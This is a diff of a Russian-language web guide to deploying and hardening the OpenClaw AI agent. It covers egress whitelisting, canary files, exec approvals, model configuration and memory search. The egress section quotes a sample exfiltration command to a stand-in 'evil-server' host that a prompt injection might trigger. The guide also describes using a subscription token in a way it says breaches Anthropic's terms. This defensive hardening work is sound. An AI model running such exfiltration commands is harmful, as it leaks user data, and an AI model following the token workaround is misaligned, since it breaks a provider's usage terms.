-                            <span>Tailscale настроен</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Docker установлен</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Gateway привязан к loopback</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>trustedProxies настроены для Tailscale</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Токен аутентификации установлен</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Sandbox mode = "all", workspaceAccess = "rw"</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>dmPolicy = allowlist с твоим ID</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span>Права на файлы 600/700</span>
-                        </label>
-                        <label class="checklist-item">
-                            <input type="checkbox">
-                            <span><code>openclaw security audit --deep</code> без критических ошибок</span>
-                        </label>
-                    </div>
-
-                    <div class="callout callout-success">
-                        <span class="callout-icon">&#127881;</span>
-                        <div class="callout-content">
-                            <strong>Готово! Ты построил цифровой бункер.</strong>
-                            <p>Твой AI-агент OpenClaw заперт в Docker-контейнере, за файрволом, доступен только через VPN и работает под обычным пользователем. Теперь можно спать спокойно.</p>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- API Keys -->
-                <section id="api-keys">
-                    <h2>Получение API-ключей</h2>
-
-                    <p>OpenClaw — это "тело", а API — "мозги". Нужен ключ от Claude или OpenAI.</p>
-
-                    <h3>Claude (Anthropic) — рекомендуется</h3>
-                    <ul>
-                        <li>Claude Pro: $20/мес</li>
-                        <li>API: от $0.003 за 1K токенов</li>
-                        <li><a href="https://console.anthropic.com/" target="_blank">Получить ключ →</a></li>
-                    </ul>
-
-                    <h3>OpenAI — альтернатива</h3>
-                    <ul>
-                        <li>ChatGPT Plus: $20/мес</li>
-                        <li>API: от $0.0015 за 1K токенов</li>
-                        <li><a href="https://platform.openai.com/" target="_blank">Получить ключ →</a></li>
-                    </ul>
-                </section>
-
-                <!-- FAQ -->
-                <section id="faq">
-                    <h2>Частые вопросы</h2>
-
-                    <details class="faq-item">
-                        <summary>Бот не отвечает в Telegram</summary>
-                        <div>
-                            <p>Проверь:</p>
-                            <ul>
-                                <li>Запущен ли OpenClaw (<code>openclaw status</code>)</li>
-                                <li>Правильный ли токен бота</li>
-                                <li>Написал ли ты боту первым (он не начинает диалог сам)</li>
-                                <li>Одобрил ли ты pairing (<code>openclaw pairing list telegram</code>)</li>
-                            </ul>
-                        </div>
-                    </details>
-
-                    <details class="faq-item">
-                        <summary>Ошибка "API key invalid"</summary>
-                        <div>
-                            <p>API-ключ неверный или истёк. Проверь ключ в консоли провайдера (Anthropic/OpenAI) и обнови в настройках OpenClaw.</p>
-                        </div>
-                    </details>
-
-                    <details class="faq-item">
-                        <summary>Как обновить OpenClaw?</summary>
-                        <div>
-                            <p>Выполни команду:</p>
-                            <div class="code-block">
-                                <pre><code>npm update -g openclaw</code></pre>
+                        <div class="callout callout-warning">
+                            <span class="callout-icon">&#9888;&#65039;</span>
+                            <div class="callout-content">
+                                <strong>Дефолтный sandbox-образ не включает Node.js</strong>
+                                <p>Образ <code>openclaw-sandbox:bookworm-slim</code> — минимальный. Если субагентам нужно запускать Node.js-скрипты внутри контейнера, потребуется кастомный образ или bind mount <code>/usr/bin/node</code>.</p>
                             </div>
                         </div>
-                    </details>
 
-                    <details class="faq-item">
-                        <summary>Безопасно ли давать боту доступ к компьютеру?</summary>
-                        <div>
-                            <p>OpenClaw работает локально и не отправляет данные в облако (кроме запросов к API). Код открытый — можно проверить. Для максимальной безопасности:</p>
-                            <ul>
-                                <li>Запускай на отдельном VPS, не на основном компьютере</li>
-                                <li>Настрой sandbox (песочницу) — <a href="#security-docker">см. Этап 4</a> и <a href="#security-config">Этап 6</a></li>
-                                <li>Используй режим <code>workspaceAccess: "rw"</code> — бот заперт в Docker-контейнере, поэтому «rw» безопасно. В режиме «ro» он не сможет создавать файлы и писать код.</li>
-                                <li>Регулярно запускай <code>openclaw security audit</code></li>
-                            </ul>
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>3 уровня разрешений в sandbox</strong>
+                                <p>OpenClaw имеет три отдельных слоя контроля: <code>agents.list[].tools.allow/deny</code> (уровень агента), <code>tools.sandbox.tools</code> (фильтр инструментов sandbox), и <code>docker.network</code> (сеть контейнера). Нужно настроить ВСЕ три.</p>
+                            </div>
                         </div>
-                    </details>
 
-                    <details class="faq-item">
-                        <summary>Бот умирает при выходе из SSH</summary>
-                        <div>
-                            <p>Добро пожаловать в клуб! Это самая частая проблема. Linux — ответственный завхоз: когда ты уходишь (закрываешь SSH), он гасит свет и выключает всё, что принадлежит твоему пользователю. Включая твоего бота. Даже если бот — «служба». Ему всё равно.</p>
-                            <p><strong>Решение (одна команда, и бот станет бессмертным):</strong></p>
-                            <div class="code-block">
-                                <div class="code-header">
-                                    <span>Разрешаем боту жить без тебя</span>
-                                    <button class="copy-btn" data-copy="sudo loginctl enable-linger openuser">Копировать</button>
+                        <h3>Уровень 5: Egress whitelist — контроль исходящего трафика</h3>
+
+                        <p>Это <strong>самый мощный слой защиты</strong> при полной автономии бота. Даже если prompt injection заставит бота выполнить <code>curl https://evil-server.com/steal?data=...</code> — прокси заблокирует запрос. Данные физически не смогут уйти на неизвестный сервер.</p>
+
+                        <p>Работает через <strong>tinyproxy</strong> на хосте с режимом <code>FilterDefaultDeny On</code> — разрешены только домены из белого списка, всё остальное блокируется.</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>/etc/tinyproxy/tinyproxy.conf</span>
+                                <button class="copy-btn" data-copy='Port 8888
+Allow 127.0.0.1
+Allow 172.28.0.0/16
+Filter "/etc/tinyproxy/filter.txt"
+FilterDefaultDeny On
+FilterURLs Off
+FilterCaseSensitive Off'>Копировать</button>
+                            </div>
+                            <pre><code>Port 8888
+Allow 127.0.0.1
+Allow 172.28.0.0/16
+Filter "/etc/tinyproxy/filter.txt"
+FilterDefaultDeny On    # ВСЁ что не в списке — заблокировано
+FilterURLs Off
+FilterCaseSensitive Off</code></pre>
+                        </div>
+
+                        <p>Белый список доменов (<code>/etc/tinyproxy/filter.txt</code>) — добавляйте только те домены, которые реально нужны вашему боту:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>filter.txt — пример базового whitelist</span>
+                                <button class="copy-btn" data-copy='# AI-провайдеры (добавьте тех, кого используете)
+api\.anthropic\.com
+api\.openai\.com
+.*\.googleapis\.com
+
+# Мессенджер (обязательно для вашего канала)
+api\.telegram\.org
+
+# OpenClaw (обязательно)
+.*\.openclaw\.ai
+.*\.clawhub\.com
+
+# Поиск (если бот ищет в интернете)
+api\.tavily\.com
+.*\.wikipedia\.org
+
+# GitHub (если бот работает с кодом)
+api\.github\.com
+raw\.githubusercontent\.com
+
+# npm/pip (если бот обновляется сам)
+registry\.npmjs\.org'>Копировать</button>
+                            </div>
+                            <pre><code># AI-провайдеры (добавьте тех, кого используете)
+api\.anthropic\.com
+api\.openai\.com
+.*\.googleapis\.com
+
+# Мессенджер (обязательно для вашего канала)
+api\.telegram\.org
+
+# OpenClaw (обязательно)
+.*\.openclaw\.ai
+.*\.clawhub\.com
+
+# Поиск (если бот ищет в интернете)
+api\.tavily\.com
+.*\.wikipedia\.org
+
+# GitHub (если бот работает с кодом)
+api\.github\.com
+raw\.githubusercontent\.com
+
+# npm/pip (если бот обновляется сам)
+registry\.npmjs\.org</code></pre>
+                        </div>
+
+                        <p><strong>Принцип:</strong> начните с минимума (AI-провайдер + мессенджер + OpenClaw) и добавляйте домены по мере необходимости. Каждый новый домен — потенциальная точка утечки.</p>
+
+                        <p>Подключение sandbox к прокси — в <code>openclaw.json</code> в <code>docker.env</code>:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — прокси для контейнера</span>
+                                <button class="copy-btn" data-copy='"docker": {
+  "network": "openclaw-egress",
+  "env": {
+    "HTTP_PROXY": "http://172.28.0.1:8888",
+    "HTTPS_PROXY": "http://172.28.0.1:8888",
+    "NO_PROXY": "localhost,127.0.0.1"
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"docker": {
+  "network": "openclaw-egress",
+  "env": {
+    "HTTP_PROXY": "http://172.28.0.1:8888",
+    "HTTPS_PROXY": "http://172.28.0.1:8888",
+    "NO_PROXY": "localhost,127.0.0.1"
+  }
+}</code></pre>
+                        </div>
+
+                        <p>Docker-сеть создаётся один раз:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal</span>
+                                <button class="copy-btn" data-copy="docker network create --subnet=172.28.0.0/16 openclaw-egress
+iptables -I INPUT -i br-$(docker network inspect openclaw-egress -f '{{.Id}}' | head -c 12) -p tcp --dport 8888 -j ACCEPT">Копировать</button>
+                            </div>
+                            <pre><code># Создать сеть
+docker network create --subnet=172.28.0.0/16 openclaw-egress
+
+# Открыть порт прокси из контейнера на хост
+iptables -I INPUT -i br-$(docker network inspect openclaw-egress \
+  -f '{{.Id}}' | head -c 12) -p tcp --dport 8888 -j ACCEPT</code></pre>
+                        </div>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Добавление новых доменов</strong>
+                                <p>Когда боту нужен новый сервис — добавьте домен в <code>filter.txt</code> и перезапустите: <code>systemctl restart tinyproxy</code>. Не забывайте: каждый добавленный домен — это потенциальная точка утечки данных. Добавляйте только то, что реально используется.</p>
+                            </div>
+                        </div>
+
+                        <h3>Мониторинг: canary-файлы и аудит-лог</h3>
+
+                        <p>Два дополнительных механизма для обнаружения проблем:</p>
+
+                        <p><strong>Canary-файлы</strong> — скрипт проверяет хеши критичных файлов при каждом heartbeat (~55 мин). Если <code>openclaw.json</code>, <code>exec-approvals.json</code> или <code>filter.txt</code> изменились без вашего ведома — вы получите уведомление.</p>
+
+                        <p><strong>Аудит-лог</strong> — hook на выполнение команд, который логирует все вызовы <code>sudo</code>, <code>rm</code>, <code>curl</code> и других опасных команд в отдельный файл. Полезно для post-mortem анализа, если что-то пошло не так.</p>
+
+                        <h3>Итого: что реально важно</h3>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Мера</th><th>Приоритет</th><th>Что защищает</th></tr></thead>
+                            <tbody>
+                                <tr><td><strong>Telegram allowlist</strong></td><td>Обязательно</td><td>Кто может управлять ботом</td></tr>
+                                <tr><td><strong>Exec-approvals</strong></td><td>Рекомендуется</td><td>Какие команды бот может выполнять</td></tr>
+                                <tr><td><strong>Egress whitelist</strong></td><td>Рекомендуется</td><td>Куда бот может отправлять данные</td></tr>
+                                <tr><td>Sudo ограничения</td><td>По желанию</td><td>Глубина доступа к системе</td></tr>
+                                <tr><td>Docker sandbox</td><td>Продвинутое</td><td>Изоляция субагентов</td></tr>
+                                <tr><td>Canary + аудит-лог</td><td>Продвинутое</td><td>Обнаружение несанкционированных изменений</td></tr>
+                            </tbody>
+                        </table>
+
+                        <h3>Что НЕ нужно (частые ошибки)</h3>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Ошибка</th><th>Почему плохо</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>sandbox.mode: "all"</code></td><td>Главный агент попадает в контейнер — нет доступа к инструментам хоста</td></tr>
+                                <tr><td><code>network: none</code> в sandbox</td><td>Бот не может работать с интернетом вообще</td></tr>
+                                <tr><td><code>privileged: true</code></td><td>Опасно — контейнер получает полный доступ к хосту</td></tr>
+                                <tr><td>Монтирование <code>docker.sock</code></td><td>Полный контроль над Docker — уязвимость</td></tr>
+                                <!-- askFallback: "deny" теперь рекомендуется -->
+                            </tbody>
+                        </table>
+
+                        <div class="callout callout-info">
+                            <span class="callout-icon">&#128161;</span>
+                            <div class="callout-content">
+                                <strong>Хочешь углубиться?</strong>
+                                <p>SlowMist выпустили <a href="https://github.com/slowmist/openclaw-security-practice-guide" target="_blank">OpenClaw Security Practice Guide</a> — детальный аудит безопасности от блокчейн-секьюрити фирмы.</p>
+                            </div>
+                        </div>
+
+                    </div>
+                </details>
+
+                <!-- ==================== 5. MODELS ==================== -->
+                <details class="guide-section" id="models-section">
+                    <summary><h2 id="models">Стек моделей (Model Layering)</h2></summary>
+                    <div class="section-content">
+
+                        <p>OpenClaw может использовать несколько AI-моделей одновременно. Основная модель обрабатывает чат, а fallback-модели подхватывают, если основная недоступна.</p>
+
+                        <h3>Доступные модели</h3>
+
+                        <table class="comparison-table">
+                            <thead>
+                                <tr><th>Алиас</th><th>Модель</th><th>Провайдер</th><th>Сила</th></tr>
+                            </thead>
+                            <tbody>
+                                <tr><td><code>opus</code></td><td>Claude Opus 4.6</td><td>Anthropic (Claude Max)</td><td>Рассуждения, сложные задачи (1M контекст)</td></tr>
+                                <tr><td><code>gpt54</code></td><td>GPT-5.4</td><td>OpenAI (ChatGPT Plus)</td><td>Планирование, ревью, анализ</td></tr>
+                                <tr><td><code>codex</code></td><td>GPT-5.3 Codex</td><td>OpenAI (ChatGPT Plus)</td><td>Код, рефакторинг, дебаг</td></tr>
+                                <tr><td><code>gemini</code></td><td>Gemini 3 Pro</td><td>Google (One AI)</td><td>Большой контекст (2M!)</td></tr>
+                                <tr><td><code>flash</code></td><td>Gemini 2.5 Flash</td><td>Google AI (API key)</td><td>Быстрая, дешёвая, простые задачи</td></tr>
+                            </tbody>
+                        </table>
+
+                        <h3>Конфигурация fallbacks</h3>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — модели</span>
+                                <button class="copy-btn" data-copy='"agents": {
+  "defaults": {
+    "model": {
+      "primary": "anthropic/claude-opus-4-6",
+      "fallbacks": [
+        "openai-codex/gpt-5.4",
+        "openai-codex/gpt-5.2",
+        "google-gemini-cli/gemini-3-pro-preview"
+      ]
+    },
+    "models": {
+      "anthropic/claude-opus-4-6": { "alias": "opus", "params": { "cacheRetention": "long" } },
+      "openai-codex/gpt-5.4": { "alias": "gpt54" },
+      "openai/gpt-5.2": { "alias": "gpt52" },
+      "google/gemini-2.5-flash": { "alias": "flash" },
+      "google-gemini-cli/gemini-3-pro-preview": { "alias": "gemini" }
+    }
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"agents": {
+  "defaults": {
+    "model": {
+      "primary": "anthropic/claude-opus-4-6",
+      "fallbacks": [
+        "openai-codex/gpt-5.4",
+        "openai-codex/gpt-5.2",
+        "google-gemini-cli/gemini-3-pro-preview"
+      ]
+    },
+    "models": {
+      "anthropic/claude-opus-4-6": { "alias": "opus", "params": { "cacheRetention": "long" } },
+      "openai-codex/gpt-5.4": { "alias": "gpt54" },
+      "openai/gpt-5.2": { "alias": "gpt52" },
+      "google/gemini-2.5-flash": { "alias": "flash" },
+      "google-gemini-cli/gemini-3-pro-preview": { "alias": "gemini" }
+    }
+  }
+}</code></pre>
+                        </div>
+
+                        <p><strong>Алиасы</strong> позволяют переключать модель на лету: <code>/model opus</code>, <code>/model flash</code> и т.д. Сессия не сбрасывается — новая модель получает всю историю.</p>
+
+                        <div class="callout callout-warning">
+                            <span class="callout-icon">&#9888;&#65039;</span>
+                            <div class="callout-content">
+                                <strong>Подводный камень при смене модели</strong>
+                                <p>Если предыдущая модель делала tool calls, формат ID может не совпасть → сессия зависнет. Решение: <code>/new</code> (новая сессия).</p>
+                            </div>
+                        </div>
+
+                        <h3>Подключение Claude Max (setup-token)</h3>
+
+                        <p>Claude Max ($100/мес) можно использовать вместо API — через механизм <code>setup-token</code>.</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Шаг 1: На машине с Claude Code</span>
+                                <button class="copy-btn" data-copy="claude setup-token">Копировать</button>
+                            </div>
+                            <pre><code># Сгенерировать токен (на машине с Claude Code CLI)
+claude setup-token</code></pre>
+                        </div>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Шаг 2: На сервере OpenClaw</span>
+                                <button class="copy-btn" data-copy="openclaw models auth paste-token --provider anthropic --expires-in 365d">Копировать</button>
+                            </div>
+                            <pre><code># Вставить токен на сервере
+openclaw models auth paste-token --provider anthropic --expires-in 365d</code></pre>
+                        </div>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Шаг 3: Проверка</span>
+                                <button class="copy-btn" data-copy="openclaw models status">Копировать</button>
+                            </div>
+                            <pre><code># Проверить
+openclaw models status
+# anthropic:manual ok expires in 365d</code></pre>
+                        </div>
+
+                        <div class="callout callout-danger">
+                            <span class="callout-icon">&#9940;</span>
+                            <div class="callout-content">
+                                <strong>Важно: Terms of Service</strong>
+                                <p>Anthropic заявляет, что OAuth-токены (Free, Pro, Max) предназначены <em>исключительно</em> для Claude Code и Claude.ai. Использование в других продуктах — нарушение ToS. Setup-token работает, но вы должны знать о рисках.</p>
+                            </div>
+                        </div>
+
+                        <h3>Heartbeat — поддержание кеша и мониторинг</h3>
+
+                        <p>Heartbeat — фоновый пинг, который OpenClaw отправляет с заданным интервалом. Зачем: поддерживает prompt cache «тёплым» (экономит токены) и может выполнять проверки (canary-файлы, мониторинг).</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — heartbeat</span>
+                                <button class="copy-btn" data-copy='"heartbeat": {
+  "every": "55m",
+  "model": "google/gemini-2.5-flash"
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"heartbeat": {
+  "every": "55m",
+  "model": "google/gemini-2.5-flash"
+}</code></pre>
+                        </div>
+
+                        <p><strong>Почему 55 минут:</strong> кеш prompt caching с <code>cacheRetention: "long"</code> живёт 1 час. Heartbeat каждые 55 минут продлевает его — кеш никогда не протухает.</p>
+
+                        <p><strong>Почему flash:</strong> heartbeat использует отдельную дешёвую модель (API key, не OAuth), чтобы не нагружать основную подписку и не ломаться при протухании OAuth-токена.</p>
+
+                        <h3>Ротация setup-token</h3>
+
+                        <p>Setup-token истекает через указанный срок (обычно 365 дней). Для ротации:</p>
+                        <ol>
+                            <li>На машине с Claude Code: <code>claude setup-token</code> (генерирует новый)</li>
+                            <li>На сервере: <code>openclaw models auth paste-token --provider anthropic --expires-in 365d</code></li>
+                            <li>Hot-reload: <code>kill -USR1 $(pgrep -f openclaw-gateway | head -1)</code></li>
+                        </ol>
+                        <p>Шаги 3–4 из первоначальной настройки (добавление модели в каталог) повторять <strong>не нужно</strong> — только токен.</p>
+
+                        <p><strong>Hot-reload</strong> после любого изменения конфига (без перезапуска):</p>
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal</span>
+                                <button class="copy-btn" data-copy="kill -USR1 $(pgrep -f openclaw-gateway | head -1)">Копировать</button>
+                            </div>
+                            <pre><code>kill -USR1 $(pgrep -f openclaw-gateway | head -1)</code></pre>
+                        </div>
+
+                    </div>
+                </details>
+
+                <!-- ==================== 6. TOKEN OPTIMIZATION ==================== -->
+                <details class="guide-section" id="token-optimization-section">
+                    <summary><h2 id="token-optimization">Экономия токенов и скорость</h2></summary>
+                    <div class="section-content">
+
+                        <p>Каждое сообщение стоит токены — будь то подписка с квотой или API с оплатой за использование. Вот как тратить меньше и получать ответы быстрее.</p>
+
+                        <h3>Prompt Caching (кеширование промптов)</h3>
+
+                        <p>Системный промпт (инструкции, описания инструментов) весит 5,000–15,000 токенов и отправляется <em>при каждом запросе</em>. Кеширование позволяет запомнить эту часть.</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — cacheRetention</span>
+                                <button class="copy-btn" data-copy='"anthropic/claude-opus-4-6": {
+  "alias": "opus",
+  "params": { "cacheRetention": "long" }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"anthropic/claude-opus-4-6": {
+  "alias": "opus",
+  "params": { "cacheRetention": "long" }
+}</code></pre>
+                        </div>
+
+                        <ul>
+                            <li><code>"short"</code> — кеш 5 минут (для активного чата)</li>
+                            <li><code>"long"</code> — кеш 1 час (для редких запросов)</li>
+                        </ul>
+
+                        <p><strong>Keep-warm трюк:</strong> heartbeat каждые 55 минут продлевает часовой кеш. Кеш никогда не протухает → экономия ~15,000 токенов на каждом сообщении.</p>
+
+                        <div class="callout callout-warning">
+                            <span class="callout-icon">&#9888;&#65039;</span>
+                            <div class="callout-content">
+                                <strong>Кеширование и setup-token</strong>
+                                <p>По некоторым данным, prompt caching может не работать через setup-token — только через нативный API-ключ Anthropic. Проверяйте через <code>/usage full</code>.</p>
+                            </div>
+                        </div>
+
+                        <h3>Лимит токенов на ответ (maxTokens)</h3>
+
+                        <p>GPT-модели склонны к «словоблудию» — генерируют длинные ответы даже на простые вопросы. <code>maxTokens</code> — физический поводок:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — maxTokens для GPT</span>
+                                <button class="copy-btn" data-copy='"openai-codex/gpt-5.4": {
+  "alias": "gpt54",
+  "params": { "maxTokens": 1500 }
+},
+"openai/gpt-5.2": {
+  "alias": "gpt52",
+  "params": { "maxTokens": 1500 }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"openai-codex/gpt-5.4": {
+  "alias": "gpt54",
+  "params": { "maxTokens": 1500 }
+},
+"openai/gpt-5.2": {
+  "alias": "gpt52",
+  "params": { "maxTokens": 1500 }
+}</code></pre>
+                        </div>
+
+                        <p><strong>1500 токенов</strong> ≈ 1000 слов. Достаточно для полноценных ответов. Для Claude Opus на Max-подписке maxTokens не нужен — фиксированная квота, длина не влияет.</p>
+
+                        <h3>Оптимизация «зрения» (Vision)</h3>
+
+                        <p>Изображения стоят в <strong>5–10 раз дороже</strong> обычного текста.</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — в agents.defaults (плоское поле)</span>
+                                <button class="copy-btn" data-copy='"imageMaxDimensionPx": 800'>Копировать</button>
+                            </div>
+                            <pre><code>"imageMaxDimensionPx": 800</code></pre>
+                        </div>
+
+                        <p>Уменьшает изображения до 800px перед отправкой. Картинка 1200px → ~1500 токенов, 800px → ~700 токенов. Качество распознавания почти не страдает.</p>
+
+                        <h3>Ускорение стриминга</h3>
+
+                        <p>По умолчанию OpenClaw добавляет искусственную паузу между блоками текста. Отключаем:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — в agents.defaults</span>
+                                <button class="copy-btn" data-copy='"humanDelay": { "mode": "off" }'>Копировать</button>
+                            </div>
+                            <pre><code>"humanDelay": { "mode": "off" }</code></pre>
+                        </div>
+
+                        <h3>Защита от зацикливания</h3>
+
+                        <p>Агент может застрять в цикле — вызывать сломанный инструмент снова и снова. В OpenClaw 2026.3 прямых ключей <code>maxToolRetries</code> нет, но есть:</p>
+                        <ul>
+                            <li><code>sessions.agentToAgent.maxPingPongTurns</code> — лимит межагентных ходов (0–5)</li>
+                            <li><code>agents.defaults.subagents.runTimeoutSeconds</code> — таймаут подагентов</li>
+                            <li>Системный промпт: «Если инструмент не работает 3 раза — прекрати и сообщи»</li>
+                        </ul>
+
+                    </div>
+                </details>
+
+                <!-- ==================== 7. MEMORY / QMD ==================== -->
+                <details class="guide-section" id="memory-section">
+                    <summary><h2 id="memory">Память и QMD</h2></summary>
+                    <div class="section-content">
+
+                        <p>Стандартный поиск OpenClaw по памяти — простой: ищет по ключевым словам или читает файлы целиком. Это тратит токены и часто пропускает нужное. <strong>QMD</strong> — локальный поисковый движок, который заменяет это на трёхступенчатый поиск:</p>
+
+                        <ol>
+                            <li><strong>Лексический (BM25)</strong> — точные совпадения слов, аббревиатуры, код</li>
+                            <li><strong>Векторный (semantic)</strong> — по смыслу («настройки сети» найдёт «роутер и IP»)</li>
+                            <li><strong>ИИ-реранкинг</strong> — нейросеть оценивает топ-30 и отдаёт только релевантное</li>
+                        </ol>
+
+                        <p><strong>Результат:</strong> 2–3 точных абзаца вместо чтения десятков файлов → до 90% экономии токенов.</p>
+
+                        <h3>Установка QMD</h3>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal</span>
+                                <button class="copy-btn" data-copy="# Зависимости
+apt-get install -y unzip sqlite3 libsqlite3-dev
+curl -fsSL https://bun.sh/install | bash
+export PATH='$HOME/.bun/bin:$PATH'
+
+# Установить QMD
+bun install -g https://github.com/tobi/qmd
+bun pm -g trust @tobilu/qmd
+bun pm -g trust node-llama-cpp
+bun pm -g trust better-sqlite3
+
+# Собрать
+cd ~/.bun/install/global/node_modules/@tobilu/qmd
+bun add -d @types/node
+bun run build
+
+# Проверка
+qmd --help">Копировать</button>
+                            </div>
+                            <pre><code># Зависимости
+apt-get install -y unzip sqlite3 libsqlite3-dev
+curl -fsSL https://bun.sh/install | bash
+export PATH="$HOME/.bun/bin:$PATH"
+
+# Установить QMD
+bun install -g https://github.com/tobi/qmd
+bun pm -g trust @tobilu/qmd
+bun pm -g trust node-llama-cpp
+bun pm -g trust better-sqlite3
+
+# Собрать
+cd ~/.bun/install/global/node_modules/@tobilu/qmd
+bun add -d @types/node
+bun run build
+
+# Проверка
+qmd --help</code></pre>
+                        </div>
+
+                        <h3>Индексация и подключение</h3>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal — индексация</span>
+                                <button class="copy-btn" data-copy="# Добавить workspace
+qmd collection add /home/neroot/.openclaw/workspace --name workspace
+
+# Сгенерировать эмбеддинги (~330 МБ модель при первом запуске)
+qmd embed
+
+# Проверить
+qmd status">Копировать</button>
+                            </div>
+                            <pre><code># Добавить workspace
+qmd collection add /home/neroot/.openclaw/workspace --name workspace
+
+# Сгенерировать эмбеддинги (~330 МБ модель при первом запуске)
+qmd embed
+
+# Проверить
+qmd status</code></pre>
+                        </div>
+
+                        <p>В <code>openclaw.json</code> добавить секцию <code>memory</code> <strong>на корневом уровне</strong> (рядом с <code>agents</code>, НЕ внутри):</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — memory (корневой уровень!)</span>
+                                <button class="copy-btn" data-copy='"memory": {
+  "backend": "qmd",
+  "qmd": {
+    "includeDefaultMemory": true,
+    "update": { "interval": "5m" }
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"memory": {
+  "backend": "qmd",
+  "qmd": {
+    "includeDefaultMemory": true,
+    "update": { "interval": "5m" }
+  }
+}</code></pre>
+                        </div>
+
+                        <h3>Режимы поиска QMD</h3>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Команда</th><th>Режим</th><th>Скорость</th><th>Точность</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>qmd search "запрос"</code></td><td>BM25 (ключевые слова)</td><td>Мгновенно</td><td>Средняя</td></tr>
+                                <tr><td><code>qmd vsearch "запрос"</code></td><td>Векторный (по смыслу)</td><td>Быстро</td><td>Хорошая</td></tr>
+                                <tr><td><code>qmd query "запрос"</code></td><td>Гибридный + реранкинг</td><td>~секунды</td><td>Лучшая</td></tr>
+                            </tbody>
+                        </table>
+
+                        <h3>Расширение RAM (Swap)</h3>
+
+                        <p>Если на VPS мало RAM (< 4 ГБ), а нужен QMD — добавьте swap:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>Terminal — добавить 4 ГБ swap</span>
+                                <button class="copy-btn" data-copy="fallocate -l 4G /swapfile
+chmod 600 /swapfile
+mkswap /swapfile
+swapon /swapfile
+echo '/swapfile none swap sw 0 0' >> /etc/fstab
+free -h">Копировать</button>
+                            </div>
+                            <pre><code>fallocate -l 4G /swapfile
+chmod 600 /swapfile
+mkswap /swapfile
+swapon /swapfile
+echo '/swapfile none swap sw 0 0' >> /etc/fstab
+free -h</code></pre>
+                        </div>
+
+                    </div>
+                </details>
+
+                <!-- ==================== 8. AUTONOMY ==================== -->
+                <details class="guide-section" id="autonomy-section">
+                    <summary><h2 id="autonomy">Автономность бота</h2></summary>
+                    <div class="section-content">
+
+                        <p>Бот может обновляться сам, перезапускать gateway, управлять памятью — но в рамках безопасности.</p>
+
+                        <h3>Forwarding запросов в Telegram</h3>
+
+                        <p>Когда бот хочет выполнить команду не из allowlist — ты получаешь уведомление:</p>
+
+                        <div class="code-block">
+                            <div class="code-header">
+                                <span>openclaw.json — approvals</span>
+                                <button class="copy-btn" data-copy='"approvals": {
+  "exec": {
+    "enabled": true,
+    "mode": "targets",
+    "agentFilter": ["main"],
+    "targets": [
+      { "channel": "telegram", "to": "ТВОЙ_TELEGRAM_ID" }
+    ]
+  }
+}'>Копировать</button>
+                            </div>
+                            <pre><code>"approvals": {
+  "exec": {
+    "enabled": true,
+    "mode": "targets",
+    "agentFilter": ["main"],
+    "targets": [
+      { "channel": "telegram", "to": "ТВОЙ_TELEGRAM_ID" }
+    ]
+  }
+}</code></pre>
+                        </div>
+
+                        <p>Бот пришлёт <code>CONFIRM &lt;OTP&gt;</code>. Ты отвечаешь: <code>/approve &lt;id&gt; allow-once</code> или <code>/approve &lt;id&gt; deny</code>.</p>
+
+                        <h3>Elevated exec — третий слой блокировки</h3>
+
+                        <p><code>tools.elevated</code> — это <strong>отдельный механизм</strong>, который перехватывает «опасные» команды (<code>sudo</code>, <code>kill</code> и др.) <em>поверх</em> exec-approvals. Даже если allowlist разрешает <code>sudo</code> — elevated заблокирует его отдельно. Это самая частая причина проблемы «настроил allowlist, а sudo не работает».</p>
+
+                        <p><strong>Два способа управления:</strong></p>
+
+                        <p><strong>Способ 1 — Через Telegram (динамически):</strong></p>
+
+                        <table class="comparison-table">
+                            <thead><tr><th>Команда</th><th>Что делает</th></tr></thead>
+                            <tbody>
+                                <tr><td><code>/elevated full</code></td><td>Полная автономия — sudo без подтверждений (пропускает все 3 слоя)</td></tr>
+                                <tr><td><code>/elevated ask</code></td><td>Каждая sudo-команда требует кнопку Allow/Deny</td></tr>
+                            </tbody>
